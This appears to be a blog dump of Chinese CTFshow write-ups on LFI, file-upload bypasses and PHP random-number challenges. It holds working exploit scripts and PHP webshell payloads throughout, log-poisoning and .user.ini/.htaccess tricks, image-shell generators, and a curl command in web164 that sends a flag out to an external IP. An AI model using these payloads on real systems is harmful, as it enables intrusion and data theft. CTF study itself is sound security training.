\u0026#34;\u0026#34; 47 while len(d) \u0026lt; offset: 48 d += s.recv(offset) 49 try: 50 i = d.index(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 51 fn = d[i+17:i+31] 52 except ValueError: 53 return None 54 55 s2.send(lfireq % (fn, host)) 56 d = s2.recv(4096) 57 s.close() 58 s2.close() 59 60 if d.find(tag) != -1: 61 return fn 62 63counter=0 64class ThreadWorker(threading.Thread): 65 def __init__(self, e, l, m, *args): 66 threading.Thread.__init__(self) 67 self.event = e 68 self.lock = l 69 self.maxattempts = m 70 self.args = args 71 72 def run(self): 73 global counter 74 while not self.event.is_set(): 75 with self.lock: 76 if counter \u0026gt;= self.maxattempts: 77 return 78 counter+=1 79 80 try: 81 x = phpInfoLFI(*self.args) 82 if self.event.is_set(): 83 break 84 if x: 85 print \u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34; 86 self.event.set() 87 88 except socket.error: 89 return 90 91 92def getOffset(host, port, phpinforeq): 93 \u0026#34;\u0026#34;\u0026#34;Gets offset of tmp_name in the php output\u0026#34;\u0026#34;\u0026#34; 94 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 95 s.connect((host,port)) 96 s.send(phpinforeq) 97 98 d = \u0026#34;\u0026#34; 99 while True: 100 i = s.recv(4096) 101 d+=i 102 if i == \u0026#34;\u0026#34;: 103 break 104 # detect the final chunk 105 if i.endswith(\u0026#34;0\\r\\n\\r\\n\u0026#34;): 106 break 107 s.close() 108 i = d.find(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 109 if i == -1: 110 raise ValueError(\u0026#34;No php tmp_name in phpinfo output\u0026#34;) 111 112 print \u0026#34;found %s at %i\u0026#34; % (d[i:i+10],i) 113 # padded up a bit 114 return i+256 115 116def main(): 117 118 print \u0026#34;LFI With PHPInfo()\u0026#34; 119 print \u0026#34;-=\u0026#34; * 30 120 121 if len(sys.argv) \u0026lt; 2: 122 print \u0026#34;Usage: %s host [port] [threads]\u0026#34; % sys.argv[0] 123 sys.exit(1) 124 125 try: 126 host = socket.gethostbyname(sys.argv[1]) 127 except socket.error, e: 128 print \u0026#34;Error with hostname %s: %s\u0026#34; % (sys.argv[1], e) 129 sys.exit(1) 130 131 port=80 132 try: 133 port = int(sys.argv[2]) 134 except IndexError: 135 pass 136 except ValueError, e: 137 print \u0026#34;Error with port %d: %s\u0026#34; % (sys.argv[2], e) 138 sys.exit(1) 139 140 poolsz=10 141 try: 142 poolsz = int(sys.argv[3]) 143 except IndexError: 144 pass 145 except ValueError, e: 146 print \u0026#34;Error with poolsz %d: %s\u0026#34; % (sys.argv[3], e) 147 sys.exit(1) 148 149 print \u0026#34;Getting initial offset...\u0026#34;, 150 reqphp, tag, reqlfi = setup(host, port) 151 offset = getOffset(host, port, reqphp) 152 sys.stdout.flush() 153 154 maxattempts = 1000 155 e = threading.Event() 156 l = threading.Lock() 157 158 print \u0026#34;Spawning worker pool (%d)...\u0026#34; % poolsz 159 sys.stdout.flush() 160 161 tp = [] 162 for i in range(0,poolsz): 163 tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) 164 165 for t in tp: 166 t.start() 167 try: 168 while not e.wait(1): 169 if e.is_set(): 170 break 171 with l: 172 sys.stdout.write( \u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) 173 sys.stdout.flush() 174 if counter \u0026gt;= maxattempts: 175 break 176 print 177 if e.is_set(): 178 print \u0026#34;Woot! \\m/\u0026#34; 179 else: 180 print \u0026#34;:(\u0026#34; 181 except KeyboardInterrupt: 182 print \u0026#34;\\nTelling threads to shutdown...\u0026#34; 183 e.set() 184 185 print \u0026#34;Shuttin\u0026#39; down...\u0026#34; 186 for t in tp: 187 t.join() 188 189if __name__==\u0026#34;__main__\u0026#34;: 190 main() ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","summary":"\u003cblockquote\u003e\n\u003cp\u003e以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"web78\"\u003eWeb78\u003c/h4\u003e\n\u003cp\u003ephp伪协议\u003c/p\u003e","title":"CTFSHOW-文件包含-Writeup"},{"content":"web151 前台验证\n将一句话木马改成png，抓包修改后缀即可\npayload:\n1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;); web152 这道题没有前端检验，但是解法跟web151是一样的\nweb153 一开始尝试了大小写绕过\n上传后发现服务器不解析\n这题可以利用.user.ini来进行文件上传\n[文件上传]浅析.user.ini的利用-CSDN博客\n首先我们在文件中写入\n这句话相当于php中的文件包含\n写入后将文件改为png上传，抓包将文件名改为.user.ini\n接着将一句话木马改为1.png上传\n接着访问 /upload/index.php\npayload:\n1=system(\u0026#39;tac ../f*\u0026#39;); 注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）\nweb154 这题跟上题差不多，只是过滤了php\n将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）\nweb155 解法同web154一样\nweb156 这题有新的waf,可以测出来waf掉了[]\n那既然这样我们直接读flag就是了\n\u0026lt;?=system(\u0026#39;cat ../f*\u0026#39;);?\u0026gt; 或者也可以用{}代替[\u0026rsquo;']\n\u0026lt;?=@eval($_GET{1});?\u0026gt; web157 这道题[]和;都被waf了\npayload:\n\u0026lt;?=system(\u0026#34;tac ../f*\u0026#34;)?\u0026gt; 不写;就行了\nweb158 这题和上题的解法一样\nweb159 这题waf掉了()\n没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧\npayload:\n\u0026lt;?=`tac ../f*`?\u0026gt; web160 一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格\n相比上一题这题将空格和``反引号和log过滤掉了\n这题我们可以考虑使用日志注入的方法\n尝试一下包含日志 nginx的log在/var/log/nginx/access.log\npayload:\n\u0026lt;?=include\u0026#34;/var/l\u0026#34;.\u0026#34;og/nginx/access.l\u0026#34;.\u0026#34;og\u0026#34;?\u0026gt; 看到有user-agent说明这条路行得通\n直接读flag\nweb161 这一题在上一题的基础上增加了文件头的检验\n我们可以通过在上传文件的时候加上图片的文件头GIF89a进行绕过\n其余和web160无异，利用文件包含进行日志注入即可\nweb162 fuzz一下可以发现这题把.也ban掉了\n所以我们在上传的.user.ini时我们可以去掉文件后缀\nGIF89a\rauto_prepend_file=1 接下来考虑怎么构造读flag\n可以通过取反绕过.的过滤，进行文件包含\n\u0026lt;?=$a=\u0026#34;Ñ\u0026#34;?\u0026gt; \u0026lt;?=$b=~$a?\u0026gt;\r\u0026lt;?=$l=\u0026#34;l\u0026#34;?\u0026gt;\r\u0026lt;?=$o=\u0026#34;o\u0026#34;?\u0026gt;\r\u0026lt;?=$g=\u0026#34;g\u0026#34;?\u0026gt;\r\u0026lt;?=include\u0026#34;/var/$l$o$g/nginx/access$b$l$o$g\u0026#34;?\u0026gt; 文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。\n日志注入即可\nweb163 这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉\n这题我们尝试使用远程文件包含\n我们把payload写在服务器上，然后起一个http服务\n记住，文件包含时要把ip转换成长整型（.被waf了）\nGIF89a\rauto_prepend_file=http://长整型ip:7777/s 传.user.ini\n接着搓一个发包脚本\n1import requests 2 3while True: 4 burp0_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/\u0026#34; 5 burp1_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/\u0026#34; 6 burp0_headers = {\u0026#34;Sec-Ch-Ua-Platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Sec-Ch-Ua\u0026#34;: \u0026#34;\\\u0026#34;Not?A_Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;130\\\u0026#34;\u0026#34;, \u0026#34;Sec-Ch-Ua-Mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/javascript, */*; q=0.01\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;empty\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 7 burp0_data = \u0026#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;.user.ini\\\u0026#34;\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF89a\\r\\nauto_prepend_file=http://长整型ip:7777/shell\\r\\n------WebKitFormBoundaryBcDoqZWhQP52WEA6--\\r\\n\u0026#34; 8 log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 9 log1 = requests.get(burp1_url) 10 print(log.status_code) 11 print(\u0026#39;\\n\u0026#39;) 12 print(log1.text) 13 if \u0026#34;ctfshow\u0026#34; in log1.text: 14 print(\u0026#39;getflag\u0026#39;) 15 break web164 这题随便传个图片试试发现多了个查看图片\nhttps://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png 从url我们可以看出这题存在图片包含\n我们可以利用这个文件包含去执行我们的图片马\n大佬的脚本，可以绕过二次渲染\n1\u0026lt;?php 2$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 3 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 4 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 5 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 6 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 7 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 8 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 9 0x66, 0x44, 0x50, 0x33); 10 11 12 13$img = imagecreatetruecolor(32, 32); 14 15for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { 16 $r = $p[$y]; 17 $g = $p[$y+1]; 18 $b = $p[$y+2]; 19 $color = imagecolorallocate($img, $r, $g, $b); 20 imagesetpixel($img, round($y / 3), 0, $color); 21} 22 23imagepng($img,\u0026#39;./1.png\u0026#39;); 24?\u0026gt; 图片马的内容 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; 没有回显\n外带读flag\nPOST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/\rGET 0=system web165 这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染\n大佬的脚本\n1\u0026lt;?php 2 /* 3 4 The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). 5 It is necessary that the size and quality of the initial image are the same as those of the processed image. 6 7 1) Upload an arbitrary image via secured files upload script 8 2) Save the processed image and launch: 9 jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt; 10 11 In case of successful injection you will get a specially crafted image, which should be uploaded again. 12 13 Since the most straightforward injection method is used, the following problems can occur: 14 1) After the second processing the injected data may become partially corrupted. 15 2) The jpg_payload.php script outputs \u0026#34;Something\u0026#39;s wrong\u0026#34;. 16 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. 17 18 Sergey Bobrov @Black2Fan. 19 20 See also: 21 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 22 23 */ 24\t25 $miniPayload = \u0026#34;\u0026lt;?=eval(\\$_POST[7]);?\u0026gt;\u0026#34;; //注意$转义 26 27 28 if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { 29 die(\u0026#39;php-gd is not installed\u0026#39;); 30 } 31 32 if(!isset($argv[1])) { 33 die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); 34 } 35 36 set_error_handler(\u0026#34;custom_error_handler\u0026#34;); 37 38 for($pad = 0; $pad \u0026lt; 1024; $pad++) { 39 $nullbytePayloadSize = $pad; 40 $dis = new DataInputStream($argv[1]); 41 $outStream = file_get_contents($argv[1]); 42 $extraBytes = 0; 43 $correctImage = TRUE; 44 45 if($dis-\u0026gt;readShort() != 0xFFD8) { 46 die(\u0026#39;Incorrect SOI marker\u0026#39;); 47 } 48 49 while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { 50 $marker = $dis-\u0026gt;readByte(); 51 $size = $dis-\u0026gt;readShort() - 2; 52 $dis-\u0026gt;skip($size); 53 if($marker === 0xDA) { 54 $startPos = $dis-\u0026gt;seek(); 55 $outStreamTmp = 56 substr($outStream, 0, $startPos) . 57 $miniPayload . 58 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . 59 substr($outStream, $startPos); 60 checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); 61 if($extraBytes !== 0) { 62 while((!$dis-\u0026gt;eof())) { 63 if($dis-\u0026gt;readByte() === 0xFF) { 64 if($dis-\u0026gt;readByte !== 0x00) { 65 break; 66 } 67 } 68 } 69 $stopPos = $dis-\u0026gt;seek() - 2; 70 $imageStreamSize = $stopPos - $startPos; 71 $outStream = 72 substr($outStream, 0, $startPos) . 73 $miniPayload . 74 substr( 75 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). 76 substr($outStream, $startPos, $imageStreamSize), 77 0, 78 $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 79 substr($outStream, $stopPos); 80 } elseif($correctImage) { 81 $outStream = $outStreamTmp; 82 } else { 83 break; 84 } 85 if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { 86 die(\u0026#39;Success!\u0026#39;); 87 } else { 88 break; 89 } 90 } 91 } 92 } 93 unlink(\u0026#39;payload_\u0026#39;.$argv[1]); 94 die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); 95 96 function checkImage($filename, $data, $unlink = FALSE) { 97 global $correctImage; 98 file_put_contents($filename, $data); 99 $correctImage = TRUE; 100 imagecreatefromjpeg($filename); 101 if($unlink) 102 unlink($filename); 103 return $correctImage; 104 } 105 106 function custom_error_handler($errno, $errstr, $errfile, $errline) { 107 global $extraBytes, $correctImage; 108 $correctImage = FALSE; 109 if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { 110 if(isset($m[1])) { 111 $extraBytes = (int)$m[1]; 112 } 113 } 114 } 115 116 class DataInputStream { 117 private $binData; 118 private $order; 119 private $size; 120 121 public function __construct($filename, $order = false, $fromString = false) { 122 $this-\u0026gt;binData = \u0026#39;\u0026#39;; 123 $this-\u0026gt;order = $order; 124 if(!$fromString) { 125 if(!file_exists($filename) || !is_file($filename)) 126 die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); 127 $this-\u0026gt;binData = file_get_contents($filename); 128 } else { 129 $this-\u0026gt;binData = $filename; 130 } 131 $this-\u0026gt;size = strlen($this-\u0026gt;binData); 132 } 133 134 public function seek() { 135 return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); 136 } 137 138 public function skip($skip) { 139 $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); 140 } 141 142 public function readByte() { 143 if($this-\u0026gt;eof()) { 144 die(\u0026#39;End Of File\u0026#39;); 145 } 146 $byte = substr($this-\u0026gt;binData, 0, 1); 147 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); 148 return ord($byte); 149 } 150 151 public function readShort() { 152 if(strlen($this-\u0026gt;binData) \u0026lt; 2) { 153 die(\u0026#39;End Of File\u0026#39;); 154 } 155 $short = substr($this-\u0026gt;binData, 0, 2); 156 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); 157 if($this-\u0026gt;order) { 158 $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); 159 } else { 160 $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); 161 } 162 return $short; 163 } 164 165 public function eof() { 166 return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); 167 } 168 } 169?\u0026gt; jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功\nweb166 zip注入\n这题只能上传zip，上传后会出现查看文件，存在文件包含\n本质上就是利用文件包含执行我们的恶意代码\nweb167 .htaccess文件利用\n什么是.htaccess？\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析\nAddType/AddHandler application/x-httpd-php \u0026#34;.jpg\u0026#34; 由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀\n再通过抓包将文件名修改为.htaccess\n接着上传我们写好的一句话木马(后缀为.jpg)\n可以看到我们的一句话木马已经被成功执行了\nweb168 基础免杀\n这题没有限制文件类型，可以上传php\n应该是对关键词有过滤\n简单拼接一下试试，没想到直接成功了\npayload\n\u0026lt;?php $a=\u0026#34;sys\u0026#34;.\u0026#34;tem\u0026#34;; $a($_REQUEST[1]);? GET 1=tac%20../flagaa.php web169 .user.ini文件包含\n前端做了校验只能传zip文件,后端又做了图片文件检查(需要改成image/png).过滤了\u0026lt;\u0026gt;和php\n先上传一个index.php，然后利用日志包含，上传.user.ini 写入以下内容进行包含然后UA里面写木马\nauto_append_file=\u0026#34;/var/log/nginx/access.log\u0026#34;\r\u0026lt;?=system(\u0026#39;cat ../flagaa.php\u0026#39;)?\u0026gt; web170 这题和web169解法一样，也是可以进行日志包含\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","summary":"\u003ch4 id=\"web151\"\u003eweb151\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126161249975\" loading=\"lazy\" src=\"../assets/image-20250126161249975.png\"\u003e\u003c/p\u003e\n\u003cp\u003e前台验证\u003c/p\u003e\n\u003cp\u003e将一句话木马改成png，抓包修改后缀即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162045356\" loading=\"lazy\" src=\"../assets/image-20250126162045356.png\"\u003e\u003c/p\u003e\n\u003cp\u003epayload:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;);\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 id=\"web152\"\u003eweb152\u003c/h4\u003e\n\u003cp\u003e这道题没有前端检验，但是解法跟web151是一样的\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162605410\" loading=\"lazy\" src=\"../assets/image-20250126162605410.png\"\u003e\u003c/p\u003e\n\u003ch4 id=\"web153\"\u003eweb153\u003c/h4\u003e\n\u003cp\u003e一开始尝试了大小写绕过\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162904156\" loading=\"lazy\" src=\"../assets/image-20250126162904156.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传后发现服务器不解析\u003c/p\u003e","title":"CTFSHOW-文件上传-Writeup"},{"content":"web21 抓个包\n我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大\npayload设置如下\n我们还要设置一下payload处理\n开始爆破，根据长度或者状态码判断即可\nweb22 域名爆破\n通过爆破ctf.show的子域名可以爆破到flag.ctf.show\n访问即可得到flag(虽然已经挂了)\nweb23 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 11:43:51 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 11:56:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14 15include(\u0026#39;flag.php\u0026#39;); 16if(isset($_GET[\u0026#39;token\u0026#39;])){ 17 $token = md5($_GET[\u0026#39;token\u0026#39;]); 18 if(substr($token, 1,1)===substr($token, 14,1) \u0026amp;\u0026amp; substr($token, 14,1) ===substr($token, 17,1)){ 19 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){ 20 echo $flag; 21 } 22 } 23}else{ 24 highlight_file(__FILE__); 25 26} 27?\u0026gt; 分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：\n1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位\n2、md5(token) 的第 14 位等于第 17 位。\n3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。\n既然不知道怎么凑那我们可以尝试爆破\n通过bp爆破一下1-1000中是否有符合上述条件的字符串\n哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来\n其他解法，可以用大佬的脚本\n1# coding: utf-8 2# alberthao 3import hashlib 4 5dic = \u0026#39;0123456789qazwsxedcrfvtgbyhnujmikolp\u0026#39; 6for a in dic: 7 for b in dic: 8 t = str(a) + str(b) 9 md5 = hashlib.md5(t.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 10 # print md5 11 # print md5[1:2] 12 # print md5[14:15] 13 # print md5[17:18] 14 if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]: 15 if (ord(md5[1:2])) \u0026gt;= 48 and ord(md5[1:2]) \u0026lt;= 57 and (ord(md5[14:15])) \u0026gt;= 48 and ord(md5[14:15]) \u0026lt;= 57: 16 if (ord(md5[17:18])) \u0026gt;= 48 and ord(md5[17:18]) \u0026lt;= 57 and (ord(md5[31:32])) \u0026gt;= 48 and ord( 17 md5[31:32]) \u0026lt;= 57: 18 if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]): 19 print(t) or\n1import hashlib 2for i in range(1,10000): 3 4md5 = hashlib.md5(str(i).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() 5 6if md5[1] != md5[14] or md5[14]!= md5[17]: 7\tcontinue 8 9if(ord(md5[1]))\u0026gt;=48 and ord(md5[1])\u0026lt;=57 and (ord(md5[31]))\u0026gt;=48 and ord(md5[31])\u0026lt;=57: 10 11\tif((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])): 12 13\tprint(i) web24 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:26:39 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 13:53:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_GET[\u0026#39;r\u0026#39;])){ 17 $r = $_GET[\u0026#39;r\u0026#39;]; 18 mt_srand(372619038); 19 if(intval($r)===intval(mt_rand())){ 20 echo $flag; 21 } 22}else{ 23 highlight_file(__FILE__); 24 echo system(\u0026#39;cat /proc/version\u0026#39;); 25} 26 27?\u0026gt; 这道题考察的是一个php伪随机数的题目\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的\n虽然说是随机数，但是同一个种子会生成同一串数字\npoc\n1\u0026lt;?php 2mt_srand(372619038); 3echo intval(mt_rand()); 4?\u0026gt; 不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag\nweb25 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-03 13:56:57 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-03 15:47:33 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15error_reporting(0); 16include(\u0026#34;flag.php\u0026#34;); 17if(isset($_GET[\u0026#39;r\u0026#39;])){ 18 $r = $_GET[\u0026#39;r\u0026#39;]; 19 mt_srand(hexdec(substr(md5($flag), 0,8))); 20 $rand = intval($r)-intval(mt_rand()); 21 if((!$rand)){ 22 if($_COOKIE[\u0026#39;token\u0026#39;]==(mt_rand()+mt_rand())){ 23 echo $flag; 24 } 25 }else{ 26 echo $rand; 27 } 28}else{ 29 highlight_file(__FILE__); 30 echo system(\u0026#39;cat /proc/version\u0026#39;); 31} 继续php伪随机数\n我们需要知道一个性质\n当mt_srand()中的种子是固定的，那么我们生成的随机数的序列就是相同的，如下\n1\u0026lt;?php 2 3mt_srand(1852100618); 4 5echo mt_rand(); 6echo mt_rand(); 7echo mt_rand(); 8echo mt_rand(); 9 10\u0026#39;\u0026#39;\u0026#39; 111640856123 121390302953 13893879251 14859994814 在这道题里面我们需要得到前三个随机数\n第一个随机数我们可以使r=0得到，第一个随机数为1640856123\n得到第一个随机数之后我们可以通过爆破的方式得到种子，从而得到第二，第三个随机数\nphp脚本(极其慢)\n1\u0026lt;?php 2$a= 390148868;//第一个随机数 3$b= 0 ; 4while (true){ 5 mt_srand($b); 6 if(mt_rand()==$a){ 7 echo \u0026#34;success:\u0026#34;+$b; 8 break; 9 } 10 echo $b; 11 echo \u0026#34;\\n\u0026#34;; 12 $b+=1; 13 14} 或者使用php_mt_seed-4.0工具\n我们可以看到不同版本的seed是不同的，我们一个个试试就行了\n1mt_srand(1852100618); 2echo mt_rand();// 第一次随机数（不能少） 3echo \u0026#34;\\ntoken：\u0026#34;; 4echo (mt_rand()+mt_rand()); //第二和第三次随机数相加，也就是我们要对token 得到token的值，我们只需要使rand为零即可得到flag\n也就是说我们只需要使r等于第一次随机数即可\n传参，得到flag\nweb26 这么多我咋爆，赌一把只爆密码\nweb27 这题是一个教务系统，需要通过账号密码登录\n先信息收集一下\n我们可以看到在账号密码下面有一个录取名单和学生学籍信息查询系统\n分别如上，那我们是否可以通过爆破学生的身份证信息从而通过录取查询查到学生的信息呢？\nbp抓个包\n哎我草，我数据呢\nforward一下（是因为数据实际上在checkdb.php才提交吗？不是很懂）\n我们可以发现其实身份证缺失的部分刚好是出生日期\n那我们可以用bp中的日期爆破功能\n爆出来的msg用unicode解码一下就能得到账号密码了\n贴个大佬的脚本\n1url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; NUM=32 2 3def run_tasks(L): U=[] for i in L: U.append(asyncio.ensure_future(i)) loop = asyncio.get_event_loop() loop.run_until_complete(asyncio.wait(U)) 4 5class TaskRuner: def init(self,n) -\u0026gt; None: self.L=[] for i in range(n): self.L.append(self.task_function(i)) self.task_num=n async def task_function(self,n): pass def run(self): run_tasks(self.L) self.on_over() def on_over(self): pass 6 7import aiohttp from urllib.parse import quote from datetime import date, timedelta 8 9class NYR: def init(self,start_date,end_date) -\u0026gt; None: self.start_date=start_date self.end_date=end_date self.delta = timedelta(days=1) self.current_date = start_date def next(self): t=self.current_date if t\u0026gt;self.end_date: return None self.current_date+=self.delta return t 10 11class Scanner(TaskRuner): def init(self,d1,d2,n) -\u0026gt; None: super().init(n) self.nyr=NYR(d1,d2) self.alive=True 12 13async def task_function(self, n): 14 while self.alive: 15 u=self.nyr.next() 16 if not u: 17 break 18 r=await self.login(u) 19 if r: 20 self.alive=False 21async def login(self,t:date): 22 url=\u0026#39;https://bbc133e5-8f17-4c12-a7a2-88fecb9ac079.challenge.ctf.show/info/checkdb.php\u0026#39; 23 n=t.year 24 y=t.month 25 r=t.day 26 n=str(n) 27 y=str(y) 28 r=str(r) 29 if len(y)==1: 30 y=\u0026#39;0\u0026#39;+y 31 if len(r)==1: 32 r=\u0026#39;0\u0026#39;+r 33 sfz=\u0026#39;621022\u0026#39;+n+y+r+\u0026#39;5237\u0026#39; 34 data={ 35 \u0026#39;a\u0026#39;:\u0026#39;高先伊\u0026#39;, 36 \u0026#39;p\u0026#39;:sfz, 37 } 38 sess=aiohttp.ClientSession() 39 try: 40 r=await sess.post(url=url,data=data,ssl=False) 41 text=await r.text() 42 js=loads(text) 43 